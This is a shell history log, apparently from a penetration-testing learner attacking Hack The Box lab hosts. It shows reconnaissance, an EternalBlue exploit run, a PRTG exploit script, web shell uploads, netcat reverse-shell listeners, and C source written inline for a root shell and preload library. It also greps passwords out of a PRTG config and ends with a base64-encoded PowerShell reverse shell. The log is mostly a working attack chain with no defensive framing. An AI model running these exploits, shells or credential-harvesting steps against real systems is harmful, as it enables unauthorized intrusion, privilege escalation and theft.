 6383  2020-11-13 22:20  ls
 6384  2020-11-13 22:20  cd ..
 6385  2020-11-13 22:20  lks
 6386  2020-11-13 22:20  ls
 6387  2020-11-13 22:20  ./create_direcotry.sh Hair10.10.10.24
 6388  2020-11-13 22:20  cde results
 6389  2020-11-13 22:20  ls
 6390  2020-11-13 22:20  cd results
 6391  2020-11-13 22:20  l
 6392  2020-11-13 22:20  rm -rf Hair10.10.10.24
 6393  2020-11-13 22:20  cd ..
 6394  2020-11-13 22:20  ./create_direcotry.sh 10.10.10.24
 6395  2020-11-13 22:20  ls
 6396  2020-11-13 22:20  cd results
 6397  2020-11-13 22:20  l
 6398  2020-11-13 22:21  cd 10.10.10.24
 6399  2020-11-13 22:21  l
 6400  2020-11-13 22:21  cd scans
 6401  2020-11-13 22:21  l
 6402  2020-11-13 22:21  nmap -sCV -oA top1000 10.10.10.24
 6403  2020-11-13 22:26  curl 10.10.10.24
 6404  2020-11-14 03:24  curl http://10.10.10.24/hair.html
 6405  2020-11-14 03:59  ls
 6406  2020-11-14 03:59  cd ..
 6407  2020-11-14 03:59  cd exploit
 6408  2020-11-14 03:59  ls
 6409  2020-11-14 04:00  cp ~/OSCP/8/tmp/shell.php ./
 6410  2020-11-14 04:00  ls
 6411  2020-11-14 04:00  vim shell.php
 6412  2020-11-14 04:00  sudo python -m SimpleHTTPServer 80
 6413  2020-11-14 04:02  cherrytree ~/OSCP/results/10.11.1.35
 6414  2020-11-14 04:02  cherrytree ~/OSCP/results/10.11.1.35/report/pain.ctb
 6415  2020-11-14 04:28  sudo nc -nlvp 1234
 6416  2020-11-14 04:32  stty raw -echo
 6417  2020-11-14 04:32  fg
 6418  2020-11-14 04:35  sudo nc -nlvp 1234
 6419  2020-11-14 04:35  stty raw -echo
 6420  2020-11-14 04:36  fg
 6421  2020-11-13 21:04  cd
 6422  2020-11-13 21:04  cd HTB
 6423  2020-11-13 21:04  ls
 6424  2020-11-13 21:04  mkdir linux_priv_esc_scripts
 6425  2020-11-13 21:04  cd linux_priv_esc_scripts
 6426  2020-11-13 21:04  locate / | grep linpeas
 6427  2020-11-13 21:05  cp /home/kali/OSCP/admin_dept/results/10.3.3.42/exploit/linpeas.sh ./
 6428  2020-11-13 21:06  sudo python -m SimpleHTTPServer 80
 6429  2020-11-13 22:26  cd ..
 6430  2020-11-13 22:26  ls
 6431  2020-11-13 22:26  cd results
 6432  2020-11-13 22:26  l
 6433  2020-11-13 22:26  cd 10.10.10.24
 6434  2020-11-13 22:26  ls
 6435  2020-11-13 22:27  cd scans
 6436  2020-11-13 22:27  gobuster dir -u http://10.10.10.24  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -o gobuster80.txt
 6437  2020-11-14 03:25  ip a
 6438  2020-11-14 03:26  sudo tcpdump  -i tun0
 6439  2020-11-14 03:29  sudo nc -nlvp 1234
 6440  2020-11-14 04:01  ipa
 6441  2020-11-14 04:01  ip a
 6442  2020-11-14 04:01  sudo nc -nlvp 1234
 6443  2020-11-14 04:05  cd ..
 6444  2020-11-14 04:05  ls
 6445  2020-11-14 04:05  cd exploit
 6446  2020-11-14 04:05  ls
 6447  2020-11-14 04:05  cp ~/OSCP/results/10.11.1.35/exploit/phpcmd.php ./
 6448  2020-11-14 04:05  ls
 6449  2020-11-14 04:05  vim phpcmd.php 
 6450  2020-11-14 04:07  sudo python -m SimpleHTTPServer 80
 6451  2020-11-14 04:09  touch bash.sh
 6452  2020-11-14 04:09  vim bash.sh
 6453  2020-11-14 04:10  chmod +x bash.sh
 6454  2020-11-14 04:10  sudo python -m SimpleHTTPServer 80
 6455  2020-11-14 04:11  vim .
 6456  2020-11-14 04:11  l
 6457  2020-11-14 04:11  sudo python -m SimpleHTTPServer 80
 6458  2020-11-14 04:12  vim fuckwit.sh
 6459  2020-11-14 04:12  sudo python -m SimpleHTTPServer 80
 6460  2020-11-14 04:18  cat ~/OSCP/results/10.11.1.73/exploit/shell.php
 6461  2020-11-14 04:18  locate / | grep pwn
 6462  2020-11-14 04:19  locate / | grep pwon
 6463  2020-11-14 04:19  cat ~/OSCP/results/10.11.1.75
 6464  2020-11-14 04:20  locate / | grep shell.php
 6465  2020-11-14 04:21  cp /home/kali/oscpdata/p0wny-shell/shell.php ./
 6466  2020-11-14 04:21  l
 6467  2020-11-14 04:21  vim shell.php
 6468  2020-11-14 04:21  sudo python -m SimpleHTTPServer 80
 6469  2020-11-14 04:24  vim shell.php
 6470  2020-11-14 04:25  sudo python -m SimpleHTTPServer 80
 6471  2020-11-14 04:27  vim shell.php
 6472  2020-11-14 04:27  sudo python -m SimpleHTTPServer 80
 6473  2020-11-14 04:36  sudo nc -nlvp 1234
 6474  2020-11-14 09:39  exit
 6475  2020-11-14 05:17  ls
 6476  2020-11-14 05:17  cd ..
 6477  2020-11-14 05:17  ls
 6478  2020-11-14 05:17  cd ..
 6479  2020-11-14 05:19  ls
 6480  2020-11-14 05:19  cd 10.10.10.24
 6481  2020-11-14 05:19  ls
 6482  2020-11-14 05:19  cd exploit
 6483  2020-11-14 05:19  ls
 6484  2020-11-14 05:19  cat << EOF > /tmp/libhax.c\n#include <stdio.h>\n#include <sys/types.h>\n#include <unistd.h>\n__attribute__ ((__constructor__))\nvoid dropshell(void){\n    chown("/tmp/rootshell", 0, 0);\n    chmod("/tmp/rootshell", 04755);\n    unlink("/etc/ld.so.preload");\n    printf("[+] done!\n");\n}\nEOF
 6485  2020-11-14 05:19  cat /tmp/libhax.c
 6486  2020-11-14 05:19  cd /tmp
 6487  2020-11-14 05:19  gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c\n
 6488  2020-11-14 05:19  l
 6489  2020-11-14 05:19  rm -f /tmp/libhax.c\n
 6490  2020-11-14 05:20  cat << EOF > /tmp/rootshell.c\n#include <stdio.h>\nint main(void){\n    setuid(0);\n    setgid(0);\n    seteuid(0);\n    setegid(0);\n    execvp("/bin/sh", NULL, NULL);\n}\nEOF
 6491  2020-11-14 05:20  gcc -o /tmp/rootshell /tmp/rootshell.c\n
 6492  2020-11-14 05:20  rm -f /tmp/rootshell.c\n
 6493  2020-11-14 05:21  l
 6494  2020-11-14 05:21  sudo python -m SimpleHTTPServer 80
 6495  2020-11-14 09:39  exit
 6496  2020-11-14 21:44  ip a
 6497  2020-11-14 21:44  exit
 6498  2020-11-14 04:44  jk
 6499  2020-11-14 04:44  cd ..
 6500  2020-11-14 04:44  cd linux_priv_esc_scripts
 6501  2020-11-14 04:44  sudo python -m SimpleHTTPServer 80
 6502  2020-11-14 21:19  ls
 6503  2020-11-14 21:19  cd ..
 6504  2020-11-14 21:19  ls
 6505  2020-11-14 21:19  cd results
 6506  2020-11-14 21:19  ls
 6507  2020-11-14 21:19  cd 10.10.10.7
 6508  2020-11-14 21:19  l
 6509  2020-11-14 21:19  cd scans
 6510  2020-11-14 21:19  l
 6511  2020-11-14 21:19  cat gobuster.txt
 6512  2020-11-14 21:19  l
 6513  2020-11-14 21:19  cd ..
 6514  2020-11-14 21:19  l
 6515  2020-11-14 21:19  cd exploit
 6516  2020-11-14 21:19  l
 6517  2020-11-14 21:19  vim 18650.py
 6518  2020-11-14 21:25  ping  10.10.10.3
 6519  2020-11-14 21:25  cd ..
 6520  2020-11-14 21:25  l
 6521  2020-11-14 21:25  cd ..
 6522  2020-11-14 21:25  l
 6523  2020-11-14 21:27  ping 10.10.10.4
 6524  2020-11-14 21:27  ls
 6525  2020-11-14 21:27  ./create_direcotry.sh 10.10.10.4
 6526  2020-11-14 21:27  ;s
 6527  2020-11-14 21:28  l
 6528  2020-11-14 21:28  cd results/10.10.10.4
 6529  2020-11-14 21:28  l
 6530  2020-11-14 21:28  cd scans
 6531  2020-11-14 21:28  l
 6532  2020-11-14 21:28  rm *
 6533  2020-11-14 21:28  l
 6534  2020-11-14 21:28  nmap -sCV -oA top1000 10.10.10.4
 6535  2020-11-14 21:28  nmap -sCV -Pn -oA top1000 10.10.10.4
 6536  2020-11-14 21:30  smbclient  -L //10.10.10.59/
 6537  2020-11-14 21:30  smbclient  -L //10.10.10.4/
 6538  2020-11-14 21:30  smbclient  -L //10.10.10.4
 6539  2020-11-14 21:30  smbmap -H 10.10.10.4 -P 139
 6540  2020-11-14 21:31  smbmap -H 10.10.10.4 -P 445
 6541  2020-11-14 21:35  searchsploit xp
 6542  2020-11-14 21:35  searchsploit windows xp
 6543  2020-11-14 21:36  searchsploit smb
 6544  2020-11-14 21:36  l
 6545  2020-11-14 21:36  cat top1000.nmap
 6546  2020-11-14 21:38  smbclient  -L //10.10.10.4
 6547  2020-11-14 21:38  smbclient   //10.10.10.4
 6548  2020-11-14 21:38  smbclient   //10.10.10.4/guest
 6549  2020-11-14 21:38  smbclient   //10.10.10.4/HTB
 6550  2020-11-14 21:39  smbclient   //10.10.10.4/HTB -U "guest"
 6551  2020-11-14 21:39  smbclient   //10.10.10.4/HTB\x00  -U "guest"
 6552  2020-11-14 21:39  smbclient   //10.10.10.4/HTB\x00  
 6553  2020-11-14 21:39  smbclient   //10.10.10.4/HTB 
 6554  2020-11-14 21:39  smbclient  -L  //10.10.10.4/HTB 
 6555  2020-11-14 21:40  caty top1000.nmap
 6556  2020-11-14 21:40  cat top1000.nmap
 6557  2020-11-14 21:40  smbclient    
 6558  2020-11-14 21:41  msfconsole -q 
 6559  2020-11-14 21:56  ls
 6560  2020-11-14 21:56  cat top1000.nmap
 6561  2020-11-14 21:56  smbclient  -L  //10.10.10.4/
 6562  2020-11-14 21:56  smbclient   //10.10.10.4/HTB 
 6563  2020-11-14 21:58  nmap  -p 139,445 --script smb-vuln* -oA vuln 10.10.10.4
 6564  2020-11-14 21:58  locate scripts
 6565  2020-11-14 21:58  locate nmap
 6566  2020-11-14 21:59  nmap  -p 139,445 --script /usr/share/nmap/scripts/smb-vuln* -oA vuln 10.10.10.4
 6567  2020-11-14 21:59  nmap  -Pn -p 139,445 --script /usr/share/nmap/scripts/smb-vuln* -oA vuln 10.10.10.4
 6568  2020-11-14 22:02  nmap  10.10.10.4
 6569  2020-11-14 22:04  cd ..
 6570  2020-11-14 22:04  cd exploit
 6571  2020-11-14 22:04  ls
 6572  2020-11-14 22:04  git lcone
 6573  2020-11-14 22:04  git clone  https://github.com/3ndG4me/AutoBlue-MS17-010.git
 6574  2020-11-14 22:04  l
 6575  2020-11-14 22:04  cd AutoBlue-MS17-010
 6576  2020-11-14 22:04  l
 6577  2020-11-14 22:04  pip install -r requirements.txt
 6578  2020-11-14 22:05  cd shellcode
 6579  2020-11-14 22:05  l
 6580  2020-11-14 22:05  ./shell_prep.sh
 6581  2020-11-14 22:06  l
 6582  2020-11-14 22:07  cd ..
 6583  2020-11-14 22:07  l
 6584  2020-11-14 22:08  python eternalblue_exploit7.py 10.10.10.4 shellcode/sc_x64_msf.bin
 6585  2020-11-14 22:08  ls
 6586  2020-11-14 22:08  vim zzz_exploit.py
 6587  2020-11-14 22:12  python eternalblue_exploit7.py 10.10.10.4 shellcode/sc_all.bin
 6588  2020-11-14 22:12  l
 6589  2020-11-14 22:12  zzz_exploit.py 10.10.10.4
 6590  2020-11-14 22:13  python zzz_exploit.py 10.10.10.4
 6591  2020-11-14 23:13  cd ..
 6592  2020-11-14 23:14  ./create_direcotry.sh 10.10.10.40
 6593  2020-11-14 23:14  ls
 6594  2020-11-14 23:14  cd results
 6595  2020-11-14 23:14  l
 6596  2020-11-14 23:14  cd 10.10.10.40
 6597  2020-11-14 23:14  ls
 6598  2020-11-14 23:14  cd scans
 6599  2020-11-14 23:14  l
 6600  2020-11-14 23:18  ping 10.10.10.40
 6601  2020-11-14 23:19  ping 10.10.10.14 
 6602  2020-11-14 23:20  ping 10.10.10.95
 6603  2020-11-14 23:20  cd ..
 6604  2020-11-14 23:20  ls
 6605  2020-11-14 23:20  ./create_direcotry.sh 10.10.10.95
 6606  2020-11-14 23:21  cd results
 6607  2020-11-14 23:21  ;l
 6608  2020-11-14 23:21  cd 10.10.10.95
 6609  2020-11-14 23:21  ls
 6610  2020-11-14 23:21  cd scans
 6611  2020-11-14 23:21  nmap -sCV -oA top1000 10.10.10.95
 6612  2020-11-14 23:21  nmap -sCV -Pn -oA top1000 10.10.10.95
 6613  2020-11-14 23:25  curl 10.10.10.95:8080
 6614  2020-11-14 23:26  gobuster dir -u http://10.10.10.95:8080/ -w /usr/share/wordlists/wfuzz/vulns/sharepoint.txt -e -k -l -s "200,204,301,302,307,403,500"   -o gobuster.txt
 6615  2020-11-14 23:26  #gobuster dir -u http://10.10.10.95:8080/ -w /usr/share/wordlists/wfuzz/vulns/sharepoint.txt -e -k -l -s "200,204,301,302,307,403,500"   -o gobuster8080.txt
 6616  2020-11-14 23:26  l
 6617  2020-11-14 23:26  rm gobuster.txt
 6618  2020-11-14 23:26  gobuster dir -u http://10.10.10.95:8080/ -w /usr/share/wordlists/wfuzz/vulns/sharepoint.txt -e -k -l -s "200,204,301,302,307,403,500"   -o gobuster8080.txt
 6619  2020-11-14 23:27  gobuster dir -u http://10.10.10.95:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -o gobuster8080.txt
 6620  2020-11-14 23:28  fg
 6621  2020-11-14 23:32  pl
 6622  2020-11-14 23:33  cd ~/OSCP/results/10.11.1.209
 6623  2020-11-14 23:33  cd exploit
 6624  2020-11-14 23:33  l
 6625  2020-11-14 23:33  vim pwn.war
 6626  2020-11-14 23:33  vim 42966.py
 6627  2020-11-14 23:34  cd ~/HTB/results/10.10.10.95/exploit
 6628  2020-11-14 23:34  cp ~/OSCP/results/10.11.1.209/exploit/* ./
 6629  2020-11-14 23:34  l
 6630  2020-11-14 23:34  python 42966.py
 6631  2020-11-14 23:35  vim pwn.war
 6632  2020-11-14 23:46  cd ..
 6633  2020-11-14 23:46  ./create_direcotry.sh 10.10.10.82
 6634  2020-11-14 23:46  cd results/10.10.10.82
 6635  2020-11-14 23:46  ls
 6636  2020-11-14 23:46  cd scn
 6637  2020-11-14 23:46  cd scans
 6638  2020-11-14 23:47  nmap -sCV -oA top1000 10.10.10.82
 6639  2020-11-14 23:52  nmap  -Pn -p 139,445 --script /usr/share/nmap/scripts/smb-vuln* -oA vuln 10.10.10.82
 6640  2020-11-14 23:53  nmap   -p 139,445 --script /usr/share/nmap/scripts/smb-vuln* -oA vuln 10.10.10.82
 6641  2020-11-14 23:54  nmap -sCV -p- -T4 -oA allport 10.10.10.82 
 6642  2020-11-14 23:58  gobuster dir -u http://10.10.10.82/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -o gobuster80.txt
 6643  2020-11-15 00:31  la
 6644  2020-11-15 00:31  cat gobuster80.txt
 6645  2020-11-15 00:33  cat vuln.
 6646  2020-11-15 00:33  cat vuln.nmap
 6647  2020-11-15 00:33  cat allport.nmap
 6648  2020-11-15 19:23  ping 10.10.10.152 
 6649  2020-11-15 19:23  cd ..
 6650  2020-11-15 19:23  ls
 6651  2020-11-15 19:23  ./create_direcotry.sh 10.10.10.152 
 6652  2020-11-15 19:23  cd results
 6653  2020-11-15 19:23  cd 10.10.10.152 
 6654  2020-11-15 19:23  ls
 6655  2020-11-15 19:23  cd scans
 6656  2020-11-15 19:24  nmap -sCV -oA top1000 10.10.10.152 
 6657  2020-11-15 19:25  smbclient  -L //10.10.10.152 
 6658  2020-11-15 19:25  ftp 10.10.10.152 
 6659  2020-11-15 19:26  ls
 6660  2020-11-15 19:26  cat top1000.nmap
 6661  2020-11-15 19:26  nmap   -p 139,445 --script /usr/share/nmap/scripts/smb-vuln* -oA vuln 10.10.10.82
 6662  2020-11-15 19:26  nmap   -p 139,445 --script /usr/share/nmap/scripts/smb-vuln* -oA vuln anonymous 
 6663  2020-11-15 19:27  nmap   -p 139,445 --script /usr/share/nmap/scripts/smb-vuln* -oA vuln 10.10.10.152
 6664  2020-11-15 19:27  sudo nmap   -p 139,445 --script /usr/share/nmap/scripts/smb-vuln* -oA vuln 10.10.10.152
 6665  2020-11-15 19:28  locate *.nse
 6666  2020-11-15 19:28  nmap --script http-headers scanme.nmap.org
 6667  2020-11-15 19:29  sudo nmap   -p 139,445 --script "/usr/share/nmap/scripts/smb-vuln*" -oA vuln 10.10.10.152
 6668  2020-11-15 19:30  sudo nmap   -p 139,445 --script /usr/share/nmap/scripts/smb-vuln-* -oA vuln 10.10.10.152
 6669  2020-11-15 19:30  sudo nmap   -p 139,445 --script scripts/smb-vuln-* -oA vuln 10.10.10.152
 6670  2020-11-15 19:30  sudo nmap   -p 139,445 --script smb-vuln-* -oA vuln 10.10.10.152
 6671  2020-11-15 19:30  sudo nmap   -p 139,445 --script "smb-vuln-*" -oA vuln 10.10.10.152
 6672  2020-11-15 19:33  sudo nmap   -p 139,445,135 --script "smb-vuln-*" -oA vuln 10.10.10.152
 6673  2020-11-15 19:34  /usr/share/nmap/scripts/smb-vuln-ms08-067.nse
 6674  2020-11-15 19:34  ls/usr/share/nmap/scripts/smb-vuln-ms08-067.nse
 6675  2020-11-15 19:35  ls /usr/share/nmap/scripts/smb-vuln-ms08-067.nse
 6676  2020-11-15 19:35  ls la-l /usr/share/nmap/scripts/smb-vuln-ms08-067.nse
 6677  2020-11-15 19:35  l /usr/share/nmap/scripts/smb-vuln-ms08-067.nse
 6678  2020-11-15 19:35  sudo nmap   -p 139,445,135 --script "smb-vuln-*" -oA vuln 10.10.10.152
 6679  2020-11-15 19:38  ls
 6680  2020-11-15 19:38  cat top1000.nmap
 6681  2020-11-15 19:39  nmap -p- -T4 -oA allport 10.10.10.152
 6682  2020-11-16 06:42  sudo nc -nlvp 1234
 6683  2020-11-16 19:32  cd ~/HTB/results/10.10.10.194/scans
 6684  2020-11-16 19:37  gobuster dir -u http://10.10.10.194/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -o gobuster80.txt
 6685  2020-11-16 19:31  cd ~/HTB/results/10.10.10.194/scans
 6686  2020-11-16 19:37  gobuster dir -u http://10.10.10.194:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -o gobuster80.txt
 6687  2020-11-16 19:37  gobuster dir -u http://10.10.10.194:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -o gobuster8080.txt
 6688  2020-11-16 19:48  sudo nc -nlvp 443
 6689  2020-11-16 23:35  cd ..
 6690  2020-11-16 23:35  cd exploit
 6691  2020-11-16 23:35  git clone https://github.com/tennc/webshell.git
 6692  2020-11-16 23:35  ls
 6693  2020-11-16 23:35  cd webshell
 6694  2020-11-16 23:35  ls
 6695  2020-11-16 23:35  cd jsp
 6696  2020-11-16 23:35  curl -h
 6697  2020-11-16 23:37  ls
 6698  2020-11-16 23:37  cp cmdjsp.jsp ../../
 6699  2020-11-16 23:37  cd ..
 6700  2020-11-16 23:37  l
 6701  2020-11-16 23:37  vim cmdjsp.jsp
 6702  2020-11-16 23:42  ls
 6703  2020-11-17 10:43  ip a
 6704  2020-11-17 10:54  ls
 6705  2020-11-17 10:54  vim bashrshell.sh
 6706  2020-11-17 10:56  stty raw -echo
 6707  2020-11-17 10:56  fg
 6708  2020-11-17 10:57  sudo nc -nlvp 443
 6709  2020-11-14 22:11  sudo nc -nlvp 443
 6710  2020-11-14 23:29  cd ..
 6711  2020-11-14 23:29  cd 10.10.10.95
 6712  2020-11-14 23:29  ls
 6713  2020-11-14 23:29  cd scans
 6714  2020-11-14 23:29  l
 6715  2020-11-14 23:29  cat top1000.gnmap top1000.nmap
 6716  2020-11-14 23:29  searchsploit Apache Tomcat
 6717  2020-11-14 23:29  cat top1000.gnmap top1000.nmap
 6718  2020-11-14 23:35  sudo nc -nlvp 443
 6719  2020-11-14 23:46  ping 10.10.10.82
 6720  2020-11-14 23:55  cd ..
 6721  2020-11-14 23:55  cd ..'
 6722  2020-11-14 23:55  cd ..
 6723  2020-11-14 23:55  cd 10.10.10.82
 6724  2020-11-14 23:55  l
 6725  2020-11-14 23:56  scd scans
 6726  2020-11-14 23:56  cd scans
 6727  2020-11-14 23:56  l
 6728  2020-11-14 23:56  smbclient -L //10.10.10.92/
 6729  2020-11-14 23:56  smbclient -L //10.10.10.82/
 6730  2020-11-14 23:56  smbmap -H 10.10.10.82 -P 445
 6731  2020-11-15 09:49  ip a
 6732  2020-11-15 19:39  ip 
 6733  2020-11-15 19:39  ip a
 6734  2020-11-15 19:40  ftp 10.10.10.152
 6735  2020-11-15 19:43  ls
 6736  2020-11-15 19:43  cat tester.txt
 6737  2020-11-15 20:05  cd ..
 6738  2020-11-15 20:05  l
 6739  2020-11-15 20:05  cd 10.10.10.152
 6740  2020-11-15 20:05  cd scans
 6741  2020-11-15 20:05  l
 6742  2020-11-15 20:05  cat top1000.nmap
 6743  2020-11-15 20:05  nmap -sCV -oA top1000 10.10.10.152
 6744  2020-11-15 20:54  Data\Paessler\PRTG Network Monitor\Monitoring
 6745  2020-11-16 02:04  ftp 10.10.10.152
 6746  2020-11-16 02:10  ls
 6747  2020-11-16 02:10  l
 6748  2020-11-16 02:10  strings PRTG\ Configuration.dat
 6749  2020-11-16 02:20  ls
 6750  2020-11-16 02:20  string PRTG\ Configuration.old.bak
 6751  2020-11-16 02:20  strings PRTG\ Configuration.old.bak
 6752  2020-11-16 02:28  ls
 6753  2020-11-16 02:30  ftp 10.10.10.152
 6754  2020-11-16 02:31  ls
 6755  2020-11-16 02:32  strings PRTG\ Configuration.dat
 6756  2020-11-16 02:32  strings PRTG\ Configuration.old
 6757  2020-11-16 02:32  strings PRTG\ Configuration.old.bak
 6758  2020-11-16 02:35  rg PRTG\ Configuration.old.bak
 6759  2020-11-16 02:35  rg user PRTG\ Configuration.old
 6760  2020-11-16 02:39  grep i user PRTG\ Configuration.old
 6761  2020-11-16 06:17  ls
 6762  2020-11-16 06:17  grep -i
 6763  2020-11-16 06:17  grep --help
 6764  2020-11-16 06:17  grep -i "password" PRTG\ Configuration.old.bak
 6765  2020-11-16 06:19  grep -B5 -A5 -i "password" PRTG\ Configuration.old.bak
 6766  2020-11-16 06:22  grep -B5 -A5 -i "password" PRTG\ Configuration.old.bak | sed 's/^/'
 6767  2020-11-16 06:22  grep -B5 -A5 -i "password" PRTG\ Configuration.old.bak | sed 's/ /g' | sort
 6768  2020-11-16 06:24  grep -B5 -A5 -i "password" PRTG\ Configuration.old.bak | sed 's/ //g' | sort
 6769  2020-11-16 06:28  searchsploit PRTG
 6770  2020-11-16 06:29  searchsploit windows/webapps/46527.sh
 6771  2020-11-16 06:29  searchsploit -x windows/webapps/46527.sh
 6772  2020-11-16 06:29  searchsploit -h
 6773  2020-11-16 06:29  searchsploit -p windows/webapps/46527.sh
 6774  2020-11-16 06:29  ls
 6775  2020-11-16 06:29  l
 6776  2020-11-16 06:30  cd ..
 6777  2020-11-16 06:30  ls
 6778  2020-11-16 06:30  cd exploit
 6779  2020-11-16 06:30  searchsploit -p windows/webapps/46527.sh
 6780  2020-11-16 06:30  cp /usr/share/exploitdb/exploits/windows/webapps/46527.sh ./
 6781  2020-11-16 06:30  ls
 6782  2020-11-16 06:30  vim 46527.sh
 6783  2020-11-16 06:30  ./46527.sh
 6784  2020-11-16 06:30  vim 46527.sh
 6785  2020-11-16 06:30  ./46527.sh
 6786  2020-11-16 06:30  vim 46527.sh
 6787  2020-11-16 06:31  bash 46527.sh
 6788  2020-11-16 06:31  vim 46527.sh
 6789  2020-11-16 06:39  ks
 6790  2020-11-16 06:40  locate ps1
 6791  2020-11-16 06:40  locate ../../ ps1
 6792  2020-11-16 06:40  cd ..
 6793  2020-11-16 06:40  ls
 6794  2020-11-16 06:40  cd ..
 6795  2020-11-16 06:40  locate ./ | grep ps1
 6796  2020-11-16 06:40  locate ./ | grep ps
 6797  2020-11-16 06:40  locate ./ | grep p
 6798  2020-11-16 06:40  locate ./ | grep ps1
 6799  2020-11-16 06:40  find  ./ | grep ps1
 6800  2020-11-16 06:40  cd 10.10.10.152
 6801  2020-11-16 06:40  l
 6802  2020-11-16 06:40  cd exploit
 6803  2020-11-16 06:40  l
 6804  2020-11-16 06:41  cp ./10.10.10.59/exploit/shell.ps1 ./
 6805  2020-11-16 06:41  cp ../../10.10.10.59/exploit/shell.ps1 ./
 6806  2020-11-16 06:41  l
 6807  2020-11-16 06:41  vim shell.ps1
 6808  2020-11-16 06:41  ip a
 6809  2020-11-16 06:41  vim shell.ps1
 6810  2020-11-16 06:42  ls
 6811  2020-11-16 06:43  cat shell.ps1 | iconv -t UTF-16LE | base64 -w0
 6812  2020-11-16 06:43  cat shell.ps1 | iconv -t UTF-16LE | base64 -w0 | xclip
 6813  2020-11-16 06:43  sudo apt install xclip
 6814  2020-11-16 06:44  cat shell.ps1 | iconv -t UTF-16LE | base64 -w0 | xclip
 6815  2020-11-16 06:44  ZgB1AG4AYwB0AGkAbwBuACAASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwAAoAewAKADwAIwAKAC4AUwBZAE4ATwBQAFMASQBTAAoATgBpAHMAaABhAG4AZwAgAHMAYwByAGkAcAB0ACAAdwBoAGkAYwBoACAAYwBhAG4AIABiAGUAIAB1AHMAZQBkACAAZgBvAHIAIABSAGUAdgBlAHIAcwBlACAAbwByACAAQgBpAG4AZAAgAGkAbgB0AGUAcgBhAGMAdABpAHYAZQAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIABmAHIAbwBtACAAYQAgAHQAYQByAGcAZQB0AC4ACgAKAC4ARABFAFMAQwBSAEkAUABUAEkATwBOAAoAVABoAGkAcwAgAHMAYwByAGkAcAB0ACAAaQBzACAAYQBiAGwAZQAgAHQAbwAgAGMAbwBuAG4AZQBjAHQAIAB0AG8AIABhACAAcwB0AGEAbgBkAGEAcgBkACAAbgBlAHQAYwBhAHQAIABsAGkAcwB0AGUAbgBpAG4AZwAgAG8AbgAgAGEAIABwAG8AcgB0ACAAdwBoAGUAbgAgAHUAcwBpAG4AZwAgAHQAaABlACAALQBSAGUAdgBlAHIAcwBlACAAcwB3AGkAdABjAGgALgAKAEEAbABzAG8ALAAgAGEAIABzAHQAYQBuAGQAYQByAGQAIABuAGUAdABjAGEAdAAgAGMAYQBuACAAYwBvAG4AbgBlAGMAdAAgAHQAbwAgAHQAaABpAHMAIABzAGMAcgBpAHAAdAAgAEIAaQBuAGQAIAB0AG8AIABhACAAcwBwAGUAYwBpAGYAaQBjACAAcABvAHIAdAAuAAoACgBUAGgAZQAgAHMAYwByAGkAcAB0ACAAaQBzACAAZABlAHIAaQB2AGUAZAAgAGYAcgBvAG0AIABQAG8AdwBlAHIAZgB1AG4AIAB3AHIAaQB0AHQAZQBuACAAYgB5ACAAQgBlAG4AIABUAHUAcgBuAGUAcgAgACYAIABEAGEAdgBlACAASABhAHIAZAB5AAoACgAuAFAAQQBSAEEATQBFAFQARQBSACAASQBQAEEAZABkAHIAZQBzAHMACgBUAGgAZQAgAEkAUAAgAGEAZABkAHIAZQBzAHMAIAB0AG8AIABjAG8AbgBuAGUAYwB0ACAAdABvACAAdwBoAGUAbgAgAHUAcwBpAG4AZwAgAHQAaABlACAALQBSAGUAdgBlAHIAcwBlACAAcwB3AGkAdABjAGgALgAKAAoALgBQAEEAUgBBAE0ARQBUAEUAUgAgAFAAbwByAHQACgBUAGgAZQAgAHAAbwByAHQAIAB0AG8AIABjAG8AbgBuAGUAYwB0ACAAdABvACAAdwBoAGUAbgAgAHUAcwBpAG4AZwAgAHQAaABlACAALQBSAGUAdgBlAHIAcwBlACAAcwB3AGkAdABjAGgALgAgAFcAaABlAG4AIAB1AHMAaQBuAGcAIAAtAEIAaQBuAGQAIABpAHQAIABpAHMAIAB0AGgAZQAgAHAAbwByAHQAIABvAG4AIAB3AGgAaQBjAGgAIAB0AGgAaQBzACAAcwBjAHIAaQBwAHQAIABsAGkAcwB0AGUAbgBzAC4ACgAKAC4ARQBYAEEATQBQAEwARQAKAFAAUwAgAD4AIABJAG4AdgBvAGsAZQAtAFAAbwB3AGUAcgBTAGgAZQBsAGwAVABjAHAAIAAtAFIAZQB2AGUAcgBzAGUAIAAtAEkAUABBAGQAZAByAGUAcwBzACAAMQA5ADIALgAxADYAOAAuADEAMQA5AC4AMgAxADcAIAAtAFAAbwByAHQAIAAxADIAMwA0AAoACgBBAGIAbwB2AGUAIABzAGgAbwB3AHMAIABhAG4AIABlAHgAYQBtAHAAbABlACAAbwBmACAAYQBuACAAaQBuAHQAZQByAGEAYwB0AGkAdgBlACAAUABvAHcAZQByAFMAaABlAGwAbAAgAHIAZQB2AGUAcgBzAGUAIABjAG8AbgBuAGUAYwB0ACAAcwBoAGUAbABsAC4AIABBACAAbgBlAHQAYwBhAHQALwBwAG8AdwBlAHIAYwBhAHQAIABsAGkAcwB0AGUAbgBlAHIAIABtAHUAcwB0ACAAYgBlACAAbABpAHMAdABlAG4AaQBuAGcAIABvAG4ACgB0AGgAZQAgAGcAaQB2AGUAbgAgAEkAUAAgAGEAbgBkACAAcABvAHIAdAAuAAoACgAuAEUAWABBAE0AUABMAEUACgBQAFMAIAA+ACAASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwACAALQBCAGkAbgBkACAALQBQAG8AcgB0ACAANAA0ADQANAAKAAo